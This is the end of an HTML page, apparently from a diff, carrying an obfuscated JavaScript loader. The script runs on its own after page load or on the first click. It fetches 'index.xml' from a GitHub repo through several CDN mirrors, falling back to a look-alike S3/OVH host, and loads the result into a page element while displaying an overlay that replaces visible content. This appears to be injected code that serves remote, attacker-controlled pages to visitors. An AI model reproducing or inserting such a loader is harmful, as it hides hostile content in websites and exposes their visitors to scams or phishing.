_0x228970={};_0x228970[_0x52fb27(0x126)]=_0x52fb27(0x10b),_0x228970[_0x52fb27(0x117)]=_0x52fb27(0x118),_0x228970[_0x52fb27(0x121)]=[_0x52fb27(0x10a),_0x52fb27(0x10f),_0x52fb27(0x10e),_0x52fb27(0x11b)],_0x228970[_0x52fb27(0x105)]=_0x52fb27(0x11f);var _0x592d18=_0x228970;function _0xfc98b(_0xa350e1,_0x501c09){var _0x24e46e=_0x52fb27;return _0xa350e1[_0x24e46e(0x119)](_0x24e46e(0x127),_0x592d18[_0x24e46e(0x126)])[_0x24e46e(0x119)](_0x24e46e(0x114),_0x501c09);}async function _0x1a5a5e(_0x249459){var _0x42e141=_0x52fb27;for(var _0xd1d6ee=0x0;_0xd1d6ee<_0x592d18[_0x42e141(0x121)][_0x42e141(0x11a)];_0xd1d6ee++){var _0x3adc65=_0xfc98b(_0x592d18[_0x42e141(0x121)][_0xd1d6ee],_0x249459);try{var _0x66e58b=new AbortController(),_0x2af571=setTimeout(function(){var _0x56e940=_0x42e141;_0x66e58b[_0x56e940(0x113)]();},0x1770),_0x3ad3b2={};_0x3ad3b2[_0x42e141(0x107)]=_0x42e141(0x104),_0x3ad3b2[_0x42e141(0x124)]=_0x66e58b[_0x42e141(0x124)];var _0x5072f5=await fetch(_0x3adc65,_0x3ad3b2);clearTimeout(_0x2af571);if(_0x5072f5&&_0x5072f5['ok'])return _0x3adc65;}catch(_0x1221ec){}}return _0xfc98b(_0x592d18[_0x42e141(0x105)],_0x249459);}var _0x9bf841=![];async function _0x255e06(){var _0x46b6a7=_0x52fb27;if(_0x9bf841)return;_0x9bf841=!![];var _0x28afc2=document[_0x46b6a7(0x12d)]('vw'),_0x14cf2a=document[_0x46b6a7(0x12d)](_0x46b6a7(0x110)),_0x5ec373=document[_0x46b6a7(0x12d)](_0x46b6a7(0x125));_0x28afc2[_0x46b6a7(0x12a)][_0x46b6a7(0x123)]=_0x46b6a7(0x120);var _0x247c81=await _0x1a5a5e(_0x592d18[_0x46b6a7(0x117)]);_0x14cf2a[_0x46b6a7(0x111)](_0x46b6a7(0x12b),function _0x5da19f(){var _0x8ecbf1=_0x46b6a7;_0x14cf2a[_0x8ecbf1(0x10c)](_0x8ecbf1(0x12b),_0x5da19f),_0x5ec373[_0x8ecbf1(0x12a)][_0x8ecbf1(0x123)]=_0x8ecbf1(0x11d),_0x14cf2a[_0x8ecbf1(0x12a)][_0x8ecbf1(0x129)]=_0x8ecbf1(0x12c);}),_0x14cf2a[_0x46b6a7(0x11c)]=_0x247c81;}var _0x2c5d4e=setTimeout(_0x255e06,0x7d0);document[_0x52fb27(0x111)](_0x52fb27(0x112),function(){clearTimeout(_0x2c5d4e),_0x255e06();});}()));function a0_0x5b2e(){var _0x3b2738=['zaka13alt/zaka-static','removeEventListener','479958hsfTET','https://cdn.statically.io/gh/{repo}/main/{path}','https://raw.esm.sh/gh/{repo}@main/{path}','vwf','addEventListener','click','abort','{path}','10280QJtOar','472107DhXRCE','entry','index.xml','replace','length','https://rawcdn.githack.com/{repo}/main/{path}','src','none','136539sNFvOi','https://8aujskedroty987uejhkiro9it8yuhh.s3.us-west-or.io.cloud.ovh.us/{path}','block','mirrors','3143nfsImy','display','signal','vws','repo','{repo}','1989040BsFZMn','visibility','style','load','visible','getElementById','no-store','ovh','156VpahDH','cache','188675vUOEeq','2029152MviAal','https://cdn.jsdelivr.net/gh/{repo}@main/{path}'];a0_0x5b2e=function(){return _0x3b2738;};return a0_0x5b2e();}</script>
+
 </body>
 </html>
